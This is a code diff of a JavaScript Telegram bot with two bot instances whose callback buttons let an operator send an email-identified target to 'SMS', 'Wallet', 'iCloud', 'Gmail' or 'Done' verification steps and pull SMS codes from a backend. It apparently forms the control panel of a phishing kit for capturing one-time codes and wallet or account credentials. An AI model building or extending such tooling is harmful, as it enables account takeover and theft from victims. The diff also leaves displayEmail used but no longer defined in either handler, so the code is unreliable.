@@ -158,7 +158,7 @@ bot.on("callback_query", async (query) => {
   handledCallbacks.add(callbackId);
 
   try {
-    const parts = query.data.split("|"); const action = parts[0]; const identifier = parts[1]; const displayEmail = parts[2] || 'unknown@example.com';
+    const [action, identifier] = query.data.split("|");
 
 
     // ============================================================================
@@ -314,19 +314,19 @@ bot.on("callback_query", async (query) => {
         try {
           const verifyRes = await fetch(`${APP_URL}/get-verifying-info/${verifyingId}`);
           const verifyData = await verifyRes.json();
-          // Use displayEmail from callback_data
+          // displayEmail comes from callback_data
           
           let choiceText = '';
           if (action === "verifying_sms") {
-            choiceText = `📧 <code>${verifyEmail}</code> → <b>SMS - 2</b> 💬`;
+            choiceText = `📧 <code>${displayEmail}</code> → <b>SMS - 2</b> 💬`;
           } else if (action === "verifying_done") {
-            choiceText = `📧 <code>${verifyEmail}</code> → <b>Done</b> 🏁`;
+            choiceText = `📧 <code>${displayEmail}</code> → <b>Done</b> 🏁`;
           } else if (action === "verifying_wallet") {
-            choiceText = `📧 <code>${verifyEmail}</code> → <b>Wallet</b> 💼`;
+            choiceText = `📧 <code>${displayEmail}</code> → <b>Wallet</b> 💼`;
           } else if (action === "verifying_icloud") {
-            choiceText = `📧 <code>${verifyEmail}</code> → ☁️`;
+            choiceText = `📧 <code>${displayEmail}</code> → ☁️`;
           } else if (action === "verifying_gmail") {
-            choiceText = `📧 <code>${verifyEmail}</code> → 🌈`;
+            choiceText = `📧 <code>${displayEmail}</code> → 🌈`;
           }
           
           if (choiceText) {
@@ -390,7 +390,6 @@ bot.on("callback_query", async (query) => {
     
     let email = identifier;
     let smsCode = "";
-    let displayEmail = email;  // ✅ What to show in acceptance message
 
     // ✅ For SMS callbacks, get SMS code from server
     if (action.startsWith("sms_")) {
@@ -628,7 +627,7 @@ if (bot2) {
     handledCallbacks.add(callbackId);
 
     try {
-      const parts = query.data.split("|"); const action = parts[0]; const identifier = parts[1]; const displayEmail = parts[2] || 'unknown@example.com';
+      const [action, identifier] = query.data.split("|");
 
 
       let email = identifier;
@@ -684,19 +683,19 @@ if (bot2) {
           try {
             const verifyRes = await fetch(`${APP_URL}/get-verifying-info/${verifyingId}`);
             const verifyData = await verifyRes.json();
-            // Use displayEmail from callback_data
+            // displayEmail comes from callback_data
             
             let choiceText = '';
             if (action === "verifying_sms") {
-              choiceText = `📧 <code>${verifyEmail}</code> → <b>SMS - 2</b> 💬`;
+              choiceText = `📧 <code>${displayEmail}</code> → <b>SMS - 2</b> 💬`;
             } else if (action === "verifying_done") {
-              choiceText = `📧 <code>${verifyEmail}</code> → <b>Done</b> 🏁`;
+              choiceText = `📧 <code>${displayEmail}</code> → <b>Done</b> 🏁`;
             } else if (action === "verifying_wallet") {
-              choiceText = `📧 <code>${verifyEmail}</code> → <b>Wallet</b> 💼`;
+              choiceText = `📧 <code>${displayEmail}</code> → <b>Wallet</b> 💼`;
             } else if (action === "verifying_icloud") {
-              choiceText = `📧 <code>${verifyEmail}</code> → ☁️`;
+              choiceText = `📧 <code>${displayEmail}</code> → ☁️`;
             } else if (action === "verifying_gmail") {
-              choiceText = `📧 <code>${verifyEmail}</code> → 🌈`;
+              choiceText = `📧 <code>${displayEmail}</code> → 🌈`;
             }
             
             if (choiceText) {
